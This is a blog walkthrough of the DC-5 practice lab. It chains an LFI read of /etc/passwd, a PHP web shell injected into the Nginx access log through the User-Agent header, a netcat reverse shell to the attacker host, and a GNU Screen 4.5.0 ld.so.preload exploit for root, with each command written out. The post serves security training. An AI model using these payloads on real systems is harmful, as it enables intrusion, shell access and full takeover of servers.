# DC-5

From unvalidated parameters to system file exposure, we analyze the path to root. 100% completion rooted in precision and faith. 🎯🙏

***

### 🎯 Unearthing the Truth in DC-5 | From LFI to Log Poisoning 🛡️

#### **From unvalidated parameters to system file exposure, we analyze the path to root. 100% completion rooted in precision and faith. 🎯🙏**

![](https://cdn-images-1.medium.com/max/800/1*KUy8bMlL0Qz0O0UvZfxWSA.png)

**Target:** _DC-5 (`192.168.247.26`)_ **OS:** _Linux (Debian_) **Difficulty:** _Intermediate_ **Attack Vectors:** _Web Enumeration -> Parameter Fuzzing -> Local File Inclusion (LFI) -> Log Poisoning_ -> _SUID Privilege Escalation_

> [**Not a Member?? Click Here to Read Full-Story**](https://medium.com/system-weakness/unearthing-the-truth-in-dc-5-from-lfi-to-log-poisoning-%EF%B8%8F-9812112bcce3?sk=4eba7545022c1bf098e3a5f47967171b)

### Executive Summary

**Assessment Date:** _January 24, 2026_ **Risk Level:** _CRITICAL_ **Author:** _R00t3dbyFa17h / Nicholas Mullenski_

#### Overview

An initial assessment of the “DC-5” server has identified a critical vulnerability within the web application layer. The host, running a Linux Debian environment, exposes an Nginx 1.6.2 web server. Initial reconnaissance and directory discovery led to the identification of a Local File Inclusion (LFI) vulnerability via the `thankyou.php` page. This flaw allows an attacker to bypass access controls and read sensitive system files, providing a direct path toward Remote Code Execution (RCE).

#### Key Findings (Preliminary):

* **Local File Inclusion (LFI):** The `file` parameter on `thankyou.php` is unsanitized, allowing for directory traversal and arbitrary file read.
* **System Disclosure:** Successful exfiltration of `/etc/passwd` confirmed the existence of a local user named `dc`.
* **Outdated Web Server:** The target uses Nginx 1.6.2, which is susceptible to various known exploits and configuration weaknesses.

**Strategic Recommendation (Phase 1):** Immediate remediation of the PHP `include` functions is required to prevent path traversal. Following the confirmation of LFI, the next phase will involve testing for Log Poisoning to escalate from file read to system-level command execution.

### 1.0 Initial Foothold

#### 1.1 Enumeration & Reconnaissance

* The objective of this phase was to identify the attack surface of the target machine and pinpoint specific service versions that may contain known vulnerabilities.

**1.1.1 Nmap Scan** A full service and script scan was performed to identify open ports and the software versions running on them.

**Command:** `nmap -sCV -vvv -Pn 192.168.247.26`

**Results:** The scan identified Port 80 and Port 111 as open.

* **Port 80 (HTTP):** Nginx 1.6.2 (Debian)
* **Port 111 (RPC):** rpcbind

**1.1.2 Directory Enumeration** A directory brute-force scan was initiated to map the application structure and identify potential entry points.

**Command:** `gobuster dir -u http://192.168.247.26 -w /usr/share/wordlists/dirb/common.txt`

![](https://cdn-images-1.medium.com/max/800/1*qqas7-ud_ZEeYTdx3ndTYA.png)

**Key Findings:** The scan returned several standard directories and confirmed the presence of a PHP environment.

* `/index.php` (Status: 200)
* `/contact.php` (Manual Discovery)

**1.1.3 Parameter Fuzzing** Manual inspection of the contact form revealed a redirect to `thankyou.php`. Subsequent testing focused on identifying hidden parameters that might allow for file inclusion.

#### 1.2 Exploitation: Local File Inclusion (LFI)

**1.2.1 Confirmation of Vulnerability** Utilizing `curl`, I attempted to read the `/etc/passwd` file by traversing the directory structure through the `file` parameter.

* **Note for ZSH Users:** Single quotes are required around the URL to prevent the shell from misinterpreting the `?` and `..` characters as wildcards.

**Command:** `curl 'http://192.168.247.26/thankyou.php?file=../../../../../../etc/passwd'`

![](https://cdn-images-1.medium.com/max/800/1*0mr9glE75eYOMQajqeq-sw.png)

**1.2.2 Evidence & Loot** The LFI was successful, revealing the system’s user database and confirming that the application is running with `www-data` privileges.

**Exfiltrated Data:**

* `root:x:0:0:root:/root:/bin/bash`
* `www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`
* `dc:x:1000:1000:dc,,,:/home/dc:/bin/bash`

#### 1.3 Log Analysis & Poisoning

**1.3.1 Identification of Logging Mechanism** Following the confirmation of LFI, an assessment of the Nginx logging mechanism was conducted to identify potential injection vectors. By leveraging the directory traversal vulnerability, the Nginx access log was successfully read.

**Command:** `curl -s 'http://192.168.247.26/thankyou.php?file=/var/log/nginx/access.log'`

**Analysis:** The log entry confirms that the server records the **User-Agent** string of every incoming request. This header serves as a viable injection point because its content is reflected directly into a file that we can execute via the LFI.

**1.3.2 Log Injection** A malicious request was crafted to “poison” the log file. A PHP system shell was injected into the `User-Agent` header, allowing the static log file to function as an interactive web shell.

**Command:** `curl -A "<?php system(\$_GET['cmd']); ?>" 'http://192.168.247.26/'`

#### 1.4 Remote Code Execution (RCE)

**1.4.1 Execution Verification** Remote Code Execution was verified by calling the poisoned `access.log` and passing the `id` command through the newly created `cmd` parameter.

**Command:** `curl 'http://192.168.247.26/thankyou.php?file=/var/log/nginx/access.log&cmd=id'`

![](https://cdn-images-1.medium.com/max/800/1*23-OqHQ4Ee25Y-QZb--AZg.png)

**Results:** The server executed the command and returned the following response within the page footer: `192.168.45.194 - - [25/Jan/2026:07:46:24 +1000] "GET / HTTP/1.1" 200 4037 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)"`

**1.4.2 Establishment of Interactive Foothold** With RCE confirmed, a Netcat reverse shell was initiated to transition from a web-based command interface to a stable, interactive shell on the Kali Linux VM.

**Listener (Attacker):** `nc -lvnp 4444`

**Payload Delivery:** `curl 'http://192.168.247.26/thankyou.php?file=/var/log/nginx/access.log&cmd=nc+-e+/bin/bash+192.168.45.194+4444'`

![](https://cdn-images-1.medium.com/max/800/1*uSSpOqILnhE80ZwSMWy1Aw.png)

### 2.0 Local Enumeration

#### 2.1 Local.txt flag

**2.1.1 Locating the User Flag** Standard practice for OffSec labs like DC-5 is to place the first flag in the user’s home directory. Now that you have a stable shell, you can search for it directly.

**Commands:**

```
find / -name local.txt 2>/dev/null
```

![](https://cdn-images-1.medium.com/max/800/1*wQs_Xr1KsBCwIagc02PIfg.png)

#### 2.2 Privilege Escalation Discovery

**2.2.1** Since you are currently logged in as **`www-data`**, you may not have the permissions to read files inside `/home/dc` yet. You need to find a way to escalate your privileges to either the `dc` user or `root`.

**2.2.2 Search for SUID Binaries:** One of the most common vectors for privilege escalation in these labs is finding a file with the SUID bit set, which allows you to run it with the permissions of the file owner (usually root).

**Command:**

```
find / -perm -u=s -type f 2>/dev/null
```

**2.2.3 Key Finding:** The binary **`/bin/screen-4.5.0`** was identified. Unlike standard system utilities like `passwd` or `mount`, this specific version of Screen is known to be vulnerable to a local privilege escalation exploit (CVE-2017-5618).

#### 2.3 Exploit Research

Using `searchsploit`, the identified binary was matched to a known Local Privilege Escalation exploit.

**Command:** `searchsploit screen 4.5.0`

**Results:**

* **GNU Screen 4.5.0 — Local Privilege Escalation | linux/local/41154.sh**

#### 2.4 Privilege Escalation Implementation

**2.4.1 Exploit Preparation & Cross-Compilation** The identified exploit (**41154.sh**) requires the compilation of two C components: `libhax.c` (the shared library) and `rootshell.c` (the SUID binary wrapper). Due to a **GLIBC version mismatch** and the lack of a functional compiler backend (`cc1`) on the target DC-5 host, a **static compilation** was performed on the attacker's Kali Linux VM (**192.168.45.194**).

**2.4.2 Deployment and Environmental Troubleshooting** The compiled binaries were transferred to the target’s `/tmp` directory via a Python HTTP server.

* **`libhax.so`**: A shared object designed to be injected via the dynamic linker.
* **`rootshell`**: A statically linked binary (approx. 810KB) bundled with all necessary libraries to ensure execution on the target's older Debian architecture.

#### 2.4 Exploitation: Breaking the “Screen”

**2.4.1 Forcing the Library Injection** The final escalation utilized the SUID-bit on `/bin/screen-4.5.0` to exploit a log-writing vulnerability. By targeting `/etc/ld.so.preload`, the system was forced to load the malicious `libhax.so` library upon the next execution of any SUID binary.

**Execution Commands:**

```
cd /tmp
/bin/screen-4.5.0 -D -m -L /etc/ld.so.preload echo -ne "\x0a/tmp/libhax.so"
/bin/screen-4.5.0 -ls
```

**2.4.2 Obtaining Root Access** The `libhax.so` constructor successfully modified the `/tmp/rootshell` binary, changing its owner to **root** and setting the **SUID** permission bit. Despite environmental errors regarding `ld.so` preloading, the permission change was persistent.

**Final Confirmation:**

![](https://cdn-images-1.medium.com/max/800/1*J5mgCNuhthjxmg-OUaDGxQ.png)

### 3.0 Post-Exploitation & Loot

**3.1 Proof of Compromise** With full root authority established, the assessment objectives were finalized by verifying access to the protected user and root directories. The flags were successfully located, confirming a total system compromise.

This is the final seal on the **DC-5** operation. This Red Team Mandate breaks down the technical growth, the engineering fixes, and the spiritual alignment discovered through the struggle of this lab.

### 🛡️ Red Team Mandate: DC-5 Post-Operation Analysis

### Lessons Learned & Tactical Growth

The primary takeaway from the DC-5 engagement was the necessity of **environmental adaptation**. Standard exploit scripts often fail in hardened or legacy environments due to library versioning.

* **Static vs. Dynamic Linking:** We learned that when the target’s GLIBC version is older than the attacker’s, dynamic binaries will fail. Mastering static compilation (`-static`) is a critical skill for bypassing "broken" compiler environments.
* **The “Silent” Success:** We discovered that an exploit can appear to fail with terminal errors (like the `ld.so` errors we saw) while still successfully executing its primary payload (the `chown` and `chmod` of our rootshell).
* **Persistence in the Pivot:** The lab taught us to look past the first failure. When the `screen` command didn't pop a shell immediately, we analyzed the file permissions to realize the exploit had partially succeeded, requiring only a manual follow-up.

### Engineering Remediation & Defensive Hardening

To prevent a repeat of this compromise, the following remediations are recommended for the engineering and sysadmin teams:

![](https://cdn-images-1.medium.com/max/800/1*5gie3d7tLA8dHl5LuqIf6Q.png)

### 🕊️ Spiritual Connection: The Strength of the Foundation 📜

As we close the book on DC-5, we look at the struggle we faced with the code foundations — the headers, the libraries, and the compilation errors. It reminds us that no matter how hard we work on the surface, if the foundation isn’t set correctly, the structure will not hold.

> _**“Therefore whosoever heareth these sayings of mine, and doeth them, I will liken him unto a wise man, which built his house upon a rock: And the rain descended, and the floods came, and the winds blew, and beat upon that house; and it fell not: for it was founded upon a rock.”**_\* — \*Matthew 7:24–25

**The Connection:** In this lab, we were the “winds and the floods” beating against the DC-5 server. We found the cracks in its foundation — the unvalidated parameters and the outdated “Screen” binary. Because the engineers had built their security on the “sand” of default configurations and unpatched software, their house fell.

For us, the lesson is deeper. Just as we had to fix our code’s foundation by adding the correct headers and static libraries to make it stand against the target’s environment, we must build our lives on the **Rock of Christ**. When we align our “code” (our actions and heart) with His “headers” (His Word), we become a foundation that cannot be moved by the storms of life. We don’t just “hear” the methodology; we “do” it with precision and faith, knowing that the ultimate Deliverer has already secured our victory.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

[**Join the Iron-Breach Discord Server!**\
_&#x57;elcome to Iron Breach. A community where iron sharpens iron. Join us for ethical hacking, CTF challenges, and…_&#x64;iscord.gg](https://discord.gg/bKWJUSVNyX)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 30, 2026](https://medium.com/p/9812112bcce3).

[Canonical link](https://medium.com/@nicholasmullenski/unearthing-the-truth-in-dc-5-from-lfi-to-log-poisoning-%EF%B8%8F-9812112bcce3)

Exported from [Medium](https://medium.com) on September 1, 2026.
